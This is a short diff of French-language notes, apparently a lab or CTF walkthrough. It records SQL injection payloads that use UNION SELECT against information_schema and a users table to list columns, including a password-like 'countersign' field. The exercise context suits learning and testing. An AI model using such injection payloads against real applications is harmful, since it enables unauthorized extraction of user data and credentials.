@@ -22,10 +22,10 @@ on envoie :
 
 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
 
-et on recupere beaucoup de donnees
-
+on voit qu'il existe la table users qui contient les colonnes : user_id, first_name, last_name, town, country, planet, Commentaire, countersign
 
 on fait aussi 1 AND 1=2 UNION SELECT Commentaire, planet FROM users
+(si on met autre chose qu'users, on peut voir qu'on est dans la table : Member_sql_injection)
 
 et on recupere :
 
